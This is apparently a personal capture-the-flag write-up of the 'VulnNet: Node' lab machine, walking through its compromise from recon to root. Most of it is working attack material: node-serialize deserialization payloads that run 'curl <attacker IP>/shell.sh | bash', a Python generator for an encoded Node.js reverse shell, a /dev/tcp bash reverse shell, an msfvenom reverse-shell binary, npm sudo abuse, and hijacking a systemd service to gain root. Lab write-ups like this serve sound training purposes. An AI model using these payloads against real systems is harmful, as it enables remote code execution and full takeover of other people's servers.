
# VulnNet-Node Helped-through

Name:  VulnNet: Node
Date:  28/1/2023
Difficulty: Easy 
Description:  After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?
Better Description: [JAVASCRIPT](https://www.youtube.com/watch?v=Uo3cL4nrGOk)
Goals: 
- General learn machine for JS "experience" with Javascript; jwt abusing; node related madness
- Finish my other machines while this goes on
- Go the extra mile on the reverse shell
Learnt: 
- JAVASCRIPT; service file configuration; Echo > editor
- JS serialization is very particular and how to get those particulars
- sed wont let you have no temp file, but is useful for vi as the commit editor
Beyond Root:

- Test and research more booby traps 

![1080](rootwebpagedisclosurewazu.png)


## From Sometime ago...now in 2023 

I did do some of this machine up to user.txt it just never got finished and I need to finish this week beyond roots that got left behind before finishing XCT's [[Attended-Helped-Through]] this evening and hopeful doing maybe another HTB machine. [Alh4zr3d](https://www.youtube.com/watch?v=L_9UsWabfL4)'s Funday Sunday stream are very slow comparitive to the Thursday streams and therefore useful to finish the ever increasing list of Beyond Root stuff piling up. This wil be twinned with [[Hacker-vs-Hacker-Helped-Through]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128. 
![](ping.png)

```
Tilo Mitra
Eric Ferraiuolo
Reid Burke
Andrew Wooldridge
```

![](thecookie.png)
I have developed alot in a year - if we could session hijack.
```bash
echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==" | base64 -d | sed 's/Guest/Admin/g' | base64 | sed 's/=/%3d/g'
```
Instead we are admin of nothing:
![1080](adminofnothing.png)

- Deserialize 
	- What serialization functions and libraries are in use?
	- Error on an invalid serialized object? - Send

![1080](errorsarehalfacookieworthofenumeration.png)
My original:
```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.8.73.218/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
```

Was missing from `_function` - but I also dont want npm - [From](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
```json
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.11.3.193/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout)});}()","isGuest":false,"encoding": "utf-8"}
```
I used curl to be cool, the reason it did not work the first time is the the port 80 on the Attackbox is in use. I Encoded in base64 with BurpSuite. Also I did not escape quotes 

```bash
curl -b 'InsidXNlcm5hbWUiOiJfJCRORF9GVU5DJCRfcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cDovLzEwLjExLjMuMTkzL3NoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pIiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifSI%3D' http://10.10.204.7:8080
```

Al inform the stream that the main issue is that this not signed and the serialization is not checking the type of data.

![](chatgptasatranslator.png)

Enjoy the python3 version by ChatGPT
```python
import sys

# Uopdated original from https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
# With the help of ChatGPT

if len(sys.argv) != 3:
    print("Usage: %s <LHOST> <LPORT>" % (sys.argv[0]))
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print("[+] LHOST = %s" % (IP_ADDR))
print("[+] LPORT = %s" % (PORT))
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print("[+] Encoding")
PAYLOAD = charencode(NODEJS_REV_SHELL)
print("eval(String.fromCharCode(%s))" % (PAYLOAD))
```

I used both Al's, the [ocortesl](https://ocortesl.github.io/thm-writeu), without need to get the npm package: 
- Pararenthesis! 
- `\t` and `\n` helped me but not al. 
```json
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.11.3.193/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout)});}()","isGuest":false,"encoding": "utf-8"}
```

I was really set on the making the original attempt work:
![](rshell.png)

## PrivEsc

NPM!
![](Irecentlydidthis.png)
Weirdness on the box
![](homedirforwwweirdness.png)

NPM without password on sudo can do this: [GTOFbins](https://gtfobins.github.io/gtfobins/npm/#sudo)
```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
```
Permission denied
![](permissiondenied.png)

Chmod granted - Idiomentary helps
```bash
chmod -R 777 /tmp 2>/dev/null
```

![](serv.png)

More sudo no passwording
![](moresudo.png)

The shell is weird as we have a tty inside of a tty.
```bash
find / -type f -name vulnnet-auto.timer 2>/dev/null
/etc/systemd/system/vulnnet-auto.timer
# find the job in the service above
find / -type f -name vulnnet-job.service 2>/dev/null
/etc/systemd/system/vulnnet-job.service
```

I botch the shell restart brain and box - Plus I need to time to think up all the mad linux battlegrounds trick I can think of. 

-On return -

First scape the tty inside a tty with background shell
```bash
cd /tmp
echo "bash -c 'exec bash -i &>/dev/tcp/10.11.3.193/1338 <&1'" > /srvshell.sh
chmod 777 /tmp/srvshell.sh
./srvshell.sh &
```

To avoid the exiting the nano issue with shell just use `sed` to create a replace command for vi
```bash
# See what is there
cat /etc/systemd/system/vulnnet-job.service
# Test changes
cat /etc/systemd/system/vulnnet-job.service | sed 's/ExecStart=\/bin\/df/ExecStart=\/dev\/shm\/rootshell/g'
# Tranfer a shell over for 
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.3.193 LPORT=4444 -f ELF > rootshell
# remember to chmod the shell!
vi /etc/systemd/system/vulnnet-job.service
:%s/ExecStart=\/bin\/df/ExecStart=\/dev\/shm\/rootshell/g
# Press enter
:wq
# Then PrivEsc
sudo /bin/systemctl stop vulnnet-auto.timer
sudo /bin/systemctl stop vulnnet-auto.timer
```

![](root.png)

## Beyond Root

See [[Attended-Helped-Through]] as it also has another just doing them the same day will be easier and get to Test on BSD linux and alternatives.